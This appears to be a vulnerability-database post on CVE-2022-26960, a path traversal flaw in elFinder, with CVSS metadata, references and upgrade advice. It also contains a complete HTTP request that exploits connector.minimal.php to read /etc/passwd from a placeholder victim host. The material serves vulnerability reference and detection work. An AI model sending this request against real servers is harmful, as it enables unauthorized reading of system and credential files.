---
layout: "post"
cve_id: "CVE-2022-26960"
title: "elFinder <=2.1.60 - Local File Inclusion"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-26960.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-26960.yaml"
author: "pikpikcu"
severity: "critical"
impact: "Successful exploitation of this vulnerability can lead to unauthorized access to sensitive files, remote code execution, and potential compromise of the entire system.
"
remediation: "Upgrade elFinder to version 2.1.61 or later to mitigate this vulnerability.
"
reference:
  - "https://www.synacktiv.com/publications/elfinder-the-story-of-a-repwning.html"
  - "https://github.com/Studio-42/elFinder/commit/3b758495538a448ac8830ee3559e7fb2c260c6db"
  - "https://www.synacktiv.com/publications.html"
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-26960"
  - "https://github.com/ARPSyndicate/kenzer-templates"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N', 'cvss-score': 9.1, 'cve-id': 'CVE-2022-26960', 'cwe-id': 'CWE-22', 'epss-score': 0.79151, 'epss-percentile': 0.99022, 'cpe': 'cpe:2.3:a:std42:elfinder:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'std42', 'product': 'elfinder'}"
tags:
  - "cve2022"
  - "cve"
  - "lfi"
  - "elfinder"
  - "std42"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
elFinder through 2.1.60 is affected by local file inclusion via connector.minimal.php. This allows unauthenticated remote attackers to read, write, and browse files outside the configured document root. This is due to improper handling of absolute file paths.


## ðŸŒ HTTP Request
```nohighlight
GET /elfinder/php/connector.minimal.php?cmd=file&target=l1_<@base64>/var/www/html/elfinder/files//..//..//..//..//..//../etc/passwd<@/base64>&download=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```

